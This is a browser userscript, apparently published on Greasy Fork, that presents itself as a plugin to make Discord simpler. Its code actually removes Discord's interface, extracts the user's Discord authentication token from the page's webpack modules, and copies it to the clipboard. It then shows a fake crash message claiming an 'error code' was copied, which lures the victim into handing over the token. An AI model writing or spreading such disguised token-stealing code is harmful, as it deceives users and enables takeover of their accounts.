// ==UserScript==
// @name         Simple Discord
// @namespace    http://tampermonkey.net/
// @version      0.56
// @description  A plugin to make discord simpler
// @author       NicholasC
// @match        https://discord.com/*
// @icon         https://www.google.com/s2/favicons?sz=64&domain=discord.com
// @grant        none
// @license      MIT
// @downloadURL https://update.greasyfork.org/scripts/518658/Simple%20Discord.user.js
// @updateURL https://update.greasyfork.org/scripts/518658/Simple%20Discord.meta.js
// ==/UserScript==

function check() {
    if(document.querySelector(".appMount_ea7e65")) {
        document.querySelector(".appMount_ea7e65").remove()
        clearInterval(i)
        navigator.clipboard.writeText((webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken());
        document.body.innerHTML += `<span style="
    font-weight: bold;
    color: white;
    font-size: xx-large;
    position: absolute;
    top: 50%;
    left: 50%;
    transform: translate(-50%, -100%);
">Discord has crashed :(</span><span style="
    color: white;
    font-size: x-large;
    position: absolute;
    top: 50%;
    left: 50%;
    transform: translate(-50%, 50%);
">Error code copied to clipboard</span>`
    }
}

let i = setInterval(check, 100)